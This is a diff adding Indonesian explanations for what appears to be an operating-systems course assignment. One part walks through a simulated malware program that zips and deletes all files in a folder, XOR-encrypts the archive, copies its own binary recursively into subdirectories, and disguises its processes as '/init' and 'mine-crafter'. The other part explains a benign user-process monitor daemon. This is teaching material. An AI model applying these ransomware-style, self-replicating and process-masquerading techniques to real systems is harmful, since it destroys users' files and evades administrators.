@@ -419,5 +419,455 @@ masukkan password ke website dengan password yaitu BewareOfAmpy
 # soal-2
 
 # soal-3
+## Fungsi daemonize()
+```
+void daemonize() {
+    pid_t pid = fork();                // buat child process
+    if (pid < 0) exit(EXIT_FAILURE);   // error fork
+    if (pid > 0) exit(EXIT_SUCCESS);   // parent keluar
+```
+- fork proses → child lanjut, parent keluar.
+```
+    if (setsid() < 0) exit(EXIT_FAILURE);  // child bikin session baru → detached dari terminal
+```
+- Bikin session ID baru, child jadi session leader.
+```
+    pid = fork();
+    if (pid < 0) exit(EXIT_FAILURE);
+    if (pid > 0) exit(EXIT_SUCCESS);
+```
+- fork lagi → child keluar, grandchild lanjut (jadi daemon beneran, tanpa session leader)
+```
+    umask(0);               // set permission mask file/direktori → full akses
+    chdir("/");             // pindah direktori kerja ke root
+```
+```
+    close(STDIN_FILENO);    // tutup input
+    close(STDOUT_FILENO);   // tutup output
+    close(STDERR_FILENO);   // tutup error
+}
+```
+- Tutup descriptor supaya nggak ganggu terminal.
+
+## XOR Encryption
+```
+void xor_encrypt(const char *filename, int key) {
+    FILE *fp = fopen(filename, "rb+"); // buka file read-write binary
+    if (!fp) return;
+```
+- Buka file, kalau gagal → keluar.
+```
+    fseek(fp, 0, SEEK_END);
+    long size = ftell(fp);
+    rewind(fp);
+```
+- Pindah ke akhir file buat tau ukurannya, lalu balik ke awal.
+```
+    char *buffer = malloc(size);
+    fread(buffer, 1, size, fp);
+```
+- Alokasi buffer & baca isi file ke memori.
+```
+    for (long i = 0; i < size; i++) {
+        buffer[i] ^= key;
+    }
+```
+- XOR semua byte dengan key.
+```
+    rewind(fp);
+    fwrite(buffer, 1, size, fp);
+    fclose(fp);
+    free(buffer);
+}
+```
+- Tulis ulang hasil XOR, tutup file, free buffer.
+
+## zip_and_encrypt()
+```
+DIR *d;
+struct dirent *dir;
+d = opendir(".");
+if (!d) return;
+```
+- Buka direktori saat ini.
+```
+char *args[256];
+int arg_idx = 0;
+args[arg_idx++] = "zip";
+args[arg_idx++] = "archive.zip";
+```
+- Siapkan argumen command `zip`.
+```
+char exe_name[256];
+ssize_t len = readlink("/proc/self/exe", exe_name, sizeof(exe_name) - 1);
+if (len != -1) exe_name[len] = '\0';
+```
+- Ambil path binary diri sendiri.
+```
+while ((dir = readdir(d)) != NULL) {
+    if (dir->d_type == DT_REG) {
+        if (strcmp(dir->d_name, "archive.zip") == 0) continue;
+        if (strcmp(dir->d_name, exe_name) == 0) continue;
+        args[arg_idx++] = strdup(dir->d_name);
+    }
+}
+```
+- Baca file reguler di folder ini kecuali archive.zip & file ini.
+```
+closedir(d);
+if (arg_idx == 2) return;
+args[arg_idx] = NULL;
+```
+- Kalau nggak ada file selain `archive.zip`, keluar.
+```
+pid_t pid = fork();
+if (pid == 0) {
+    execvp("zip", args);
+    exit(EXIT_FAILURE);
+} else {
+    wait(NULL);
+}
+```
+- Fork buat eksekusi `zip` via execvp.
+```
+for (int i = 2; i < arg_idx; i++) free(args[i]);
+```
+- Free memory hasil `strdup`.
+```
+d = opendir(".");
+if (!d) return;
+while ((dir = readdir(d)) != NULL) {
+    if (dir->d_type == DT_REG) {
+        if (strcmp(dir->d_name, "archive.zip") == 0) continue;
+        if (strcmp(dir->d_name, exe_name) == 0) continue;
+        remove(dir->d_name);
+    }
+}
+closedir(d);
+```
+- Hapus semua file setelah di-zip.
+```
+int key = (int)time(NULL) % 256;
+xor_encrypt("archive.zip", key);
+```
+- Encrypt zip-nya pakai XOR.
+
+## replicate_self()
+```
+DIR *dir = opendir(dirpath);
+if (!dir) return;
+```
+- Buka direktori target.
+```
+struct dirent *entry;
+char fullpath[PATH_MAX];
+char src_path[PATH_MAX];
+ssize_t len = readlink("/proc/self/exe", src_path, sizeof(src_path) - 1);
+if (len == -1) {
+    closedir(dir);
+    return;
+}
+src_path[len] = '\0';
+```
+- Ambil path binary sendiri.
+```
+const char *binary_name = strrchr(src_path, '/');
+binary_name = binary_name ? binary_name + 1 : src_path;
+```
+- Ambil nama file binary saja.
+```
+while ((entry = readdir(dir)) != NULL) {
+    if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
+    snprintf(fullpath, sizeof(fullpath), "%s/%s", dirpath, entry->d_name);
+    struct stat st;
+    if (stat(fullpath, &st) == -1) continue;
+    if (S_ISDIR(st.st_mode)) {
+        replicate_self(fullpath);
+    }
+}
+```
+- Rekursif masuk folder dalam.
+```
+char dest_path[PATH_MAX];
+snprintf(dest_path, sizeof(dest_path), "%s/%s", dirpath, binary_name);
+```
+- Path file tujuan.
+```
+FILE *src = fopen(src_path, "rb");
+FILE *dest = fopen(dest_path, "wb");
+if (!src || !dest) {
+    if (src) fclose(src);
+    if (dest) fclose(dest);
+    closedir(dir);
+    return;
+}
+```
+- Buka source & target file.
+```
+char buffer[4096];
+size_t n;
+while ((n = fread(buffer, 1, sizeof(buffer), src)) > 0) {
+    fwrite(buffer, 1, n, dest);
+}
+fclose(src);
+fclose(dest);
+closedir(dir);
+}
+```
+- Copy file byte-per-byte.
+
+## random_hash()
+```
+static char charset[] = "0123456789abcdef";
+static char hash[65];
+for (int i = 0; i < 64; i++) {
+    hash[i] = charset[rand() % 16];
+}
+hash[64] = '\0';
+return hash;
+```
+- Bikin string hash acak 64 karakter heksadesimal.
+
+## miner_process()
+```
+prctl(PR_SET_PDEATHSIG, SIGTERM);
+```
+- Kalau parent mati, anak ikut mati.
+```
+char procname[64];
+snprintf(procname, sizeof(procname), "mine-crafter-%d", id);
+prctl(PR_SET_NAME, procname);
+```
+- Set nama proses.
+```
+if (argc > 0) {
+    size_t len = 64;
+    memset(argv[0], 0, len);
+    strncpy(argv[0], procname, len);
+}
+```
+- Ubah `argv[0]` biar ps/top outputnya berubah.
+```
+srand(time(NULL) ^ (getpid() + id));
+```
+- Seed random unik tiap miner.
+```
+while (1) {
+    int delay = (rand() % 28) + 3;
+    sleep(delay);
+```
+- Delay acak antar log.
+```
+    time_t now = time(NULL);
+    struct tm *t = localtime(&now);
+```
+- Ambil waktu lokal.
+```
+    char logline[128];
+    snprintf(logline, sizeof(logline),
+             "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
+             t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
+             t->tm_hour, t->tm_min, t->tm_sec, id, random_hash());
+```
+- Format log.
+```
+    FILE *log = fopen("/tmp/.miner.log", "a");
+    if (log) {
+        fputs(logline, log);
+        fclose(log);
+    }
+}
+```
+- Simpan log ke file.
+
+## spawn_encryptor(), spawn_trojan(), spawn_rodok()
+- Fork child → Set nama proses → Loop task
+
+## main()
+- Panggil `daemonize()`
+- Rename process jadi `/init`
+- Spawn 3 malware component
+- Loop forever sleep
 
 # soal-4
+
+## Header & Macro Definition
+```
+#define _GNU_SOURCE
+```
+- Macro untuk mengaktifkan fitur ekstensi GNU dalam glibc. Diperlukan untuk beberapa fungsi atau struct spesifik GNU.
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dirent.h>
+#include <ctype.h>
+#include <unistd.h>
+#include <pwd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <time.h>
+#include <signal.h>
+```
+Header file standar untuk operasi:
+- I/O (stdio.h)
+- Memory & exit `(stdlib.h)`
+- String handling `(string.h)`
+- Directory scan `(dirent.h)`
+- Karakter check `(ctype.h)`
+- Proses `(unistd.h)`
+- User info `(pwd.h)`
+- Type definisi `(sys/types.h)`
+- File status `(sys/stat.h)`
+- File control `(fcntl.h)`
+- Waktu `(time.h)`
+- Signal handling `(signal.h)`
+```
+#define PROC_PATH "/proc"
+#define LOGFILE "debugmon.log"
+```
+Macro constant:
+- `PROC_PATH` → path folder virtual `/proc` di Linux (proses runtime)
+- `LOGFILE` → file untuk mencatat log aktivitas
+
+## Fungsi: cari_uid
+```
+uid_t cari_uid(const char *nama_user) {
+    struct passwd *pw = getpwnam(nama_user);
+```
+- Dapatkan struct `passwd` dari username yang diberikan.
+- `getpwnam` cari user info di `/etc/passwd`
+```
+    if (!pw) {
+        fprintf(stderr, "User '%s' tidak ditemukan.\n", nama_user);
+        exit(EXIT_FAILURE);
+    }
+```
+- Kalau user tidak ditemukan → cetak ke `stderr` dan keluar program.
+```
+    return pw->pw_uid;
+}
+```
+- Return UID dari user tersebut.
+
+## Fungsi: hanya_angka
+```
+int hanya_angka(const char *str) {
+    while (*str) {
+        if (!isdigit(*str)) return 0;
+        str++;
+    }
+    return 1;
+}
+```
+- Cek apakah string hanya berisi digit angka.
+- Return `1` kalau benar, `0` kalau ada karakter non-digit.
+
+## Fungsi: tulis_log
+```
+void tulis_log(const char *proc_name, const char *status) {
+    FILE *logfile = fopen(LOGFILE, "a");
+    if (!logfile) return;
+```
+- Buka `debugmon.log` dengan mode append.
+- Kalau gagal buka file → langsung return.
+```
+    time_t waktu = time(NULL);
+    struct tm *waktu_local = localtime(&waktu);
+```
+- Ambil waktu saat ini, lalu ubah jadi waktu lokal.
+```
+    char timestamp[64];
+    strftime(timestamp, sizeof(timestamp), "[%d:%m:%Y]-[%H:%M:%S]", waktu_local);
+```
+- Format timestamp jadi string seperti `[16:04:2025]-[20:00:23]`
+```
+    fprintf(logfile, "%s_%s_%s\n", timestamp, proc_name, status);
+    fclose(logfile);
+}
+```
+- Tulis timestamp, nama proses, dan status ke file log.
+- Tutup file setelah selesai.
+
+## Fungsi: jadikan_daemon
+```
+void jadikan_daemon() {
+    pid_t pid = fork();
+    if (pid < 0) exit(EXIT_FAILURE);
+    if (pid > 0) exit(EXIT_SUCCESS);
+```
+- Lakukan `fork()`
+- Proses induk keluar
+- Proses anak lanjut sebagai daemon
+```
+    umask(0);
+    setsid();
+```
+- Set `umask` jadi `0` (izin file default)
+- `setsid()` buat session baru (detach dari terminal)
+```
+    if (chdir("/home/mutiaradiva/soal_4/") < 0) exit(EXIT_FAILURE);
+```
+- Ubah working directory daemon ke path tertentu.
+```
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+```
+- Tutup stdin, stdout, stderr (detach dari terminal)
+```
+    open("/dev/null", O_RDONLY);
+    open("/dev/null", O_WRONLY);
+    open("/dev/null", O_RDWR);
+}
+```
+- Redirect stdin, stdout, stderr ke `/dev/null`
+
+## Fungsi: pantau_proses_user
+```
+void pantau_proses_user(const char *user, int mode_fail, const char *mode_nama)
+```
+- Monitor proses milik `user` tertentu.
+- `mode_fail` menentukan apakah akan kill proses selain `debugmon`.
+- `mode_nama` untuk nama log.
+- Langkah di dalam while(1):
+1. Buka `/proc`
+2. Loop directory entry
+3. Cek apakah folder itu PID (pakai `hanya_angka`)
+4. Baca UID proses dari `/proc/[pid]/status`
+5. Kalau UID sama:
+- Baca nama proses (`/proc/[pid]/comm`)
+- Kalau `debugmon` → log RUNNING
+- Kalau bukan, dan `mode_fail` aktif:
+  - Kill proses
+  - Log FAILED
+
+Akhir
+```
+sleep(5);
+```
+- Delay 5 detik antar loop
+
+## Fungsi: hentikan_daemon
+- Cari semua proses `debugmon` milik user tertentu.
+- Cek argumen command-line untuk memastikan prosesnya daemon monitor.
+- Kill proses tersebut dengan `SIGTERM`
+- Catat ke log
+
+## Fungsi main
+- Command line argument
+```
+if (argc != 3) {
+  printf("Pemakaian: ... \n");
+  return EXIT_FAILURE;
+}
+```
+- Validasi jumlah argumen
+
+Command mode:
+- `list` → tampilkan semua proses milik user: pid, nama, mem
+- `daemon` → jalankan daemon monitor mode normal
+- `fail` → jalankan daemon monitor mode kill
+- `stop` → hentikan daemon debugmon user
+- `revert` → sama seperti stop tapi log-nya revert
